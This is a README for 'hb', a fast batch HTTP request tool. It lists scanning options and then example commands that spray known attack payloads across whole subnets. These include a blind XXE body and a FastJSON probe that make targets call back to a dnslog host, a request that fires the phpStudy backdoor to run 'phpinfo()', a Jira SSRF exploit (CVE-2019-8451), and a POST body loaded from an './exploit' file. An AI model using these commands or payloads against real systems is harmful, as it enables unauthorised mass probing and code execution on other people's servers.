# hb
> Fast http batch request tool 

## Example 

### Load File Target
```
./hb -f ips.txt -p 80
```

### Add HTTP Header
```bash
./hb -host 192.168.1.1/24 -H "Host: bypasscdn"
```

### Show ProgressBar
```bash
./hb -host 192.168.1.1/24 -pg
```

### Follow redirect (30x)
```bash
./hb -host 192.168.1.1/24 -redirect
```

### Filter Response Body
```bash
./hb -host 192.168.1.1/24 -grep "admin"
```

### Filter Response Header (X-Powered-By ContentType Title)
```bash
./hb -host 192.168.1.1/24 -filter "nginx"
```

### Filter Response Status Code
```bash
./hb -host 192.168.1.1/24 -code 2 # 2xx
```

### Show Resposne Body 
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -response
```

### Shuffle Request
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -random
```

### Send Post Request
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -body "a=1&b=2&c=2"

# post body from file
./hb -host 192.168.1.1/24 -p 80,443,8080 -bodyfile ./exploit
```

### Send PUT Request
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -method PUT
```

### Show Request Error
```
./hb -host 192.168.1.1/24 -p 80,443,8080 -debug 
```

---

### Elasticsearch
```bash
./hb -host 192.168.1.1/24 -p 9200 -path "/_cat" -grep "/_cat/allocation"
```

### PHPINF0
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -path /phpinfo.php -code 2 -grep 'PHP Version' -regexp 'PHP Version(.*?)<'
```

### XXE Blind
```bash
./hb -host 192.168.1.1/24 -p 80 -path /xxe.php -body '<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY remote SYSTEM "http://{{hostname}}.dnslog/">]><x>&remote;</x>' -replace
```

### FastJSON Blind
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -H "Content-Type: application/json" -body '{"@type": "java.net.InetAddress", "val":"{{hostname}}.dnslog"}' -replace -redirect
```

### Weblogic fingerprint
```bash
./hb -host 192.168.1.1/24 -host 192.168.1.1/24 -p 80,443,7001 -H "Authorization: Basic" -code 401
```

### phpStudy Backdoor
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -H "Accept-Charset: cGhwaW5mbygpOwo=" -H "Accept-Encoding: gzip,deflate" -regexp '<tr><td class="e">disable_functions</td><td class="v">(.*?)</td>' -redirect
```

### CVE-2019-8451 Jira SSRF
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -path "/plugins/servlet/gadgets/makeRequest?url={{scheme}}://{{host}}@baidu.com/" -H "X-Atlassian-Token: no-check" -replace -grep "www.baidu.com" -regexp '<meta name="ajs-version-number" content="(.*?)">' -redirect
```


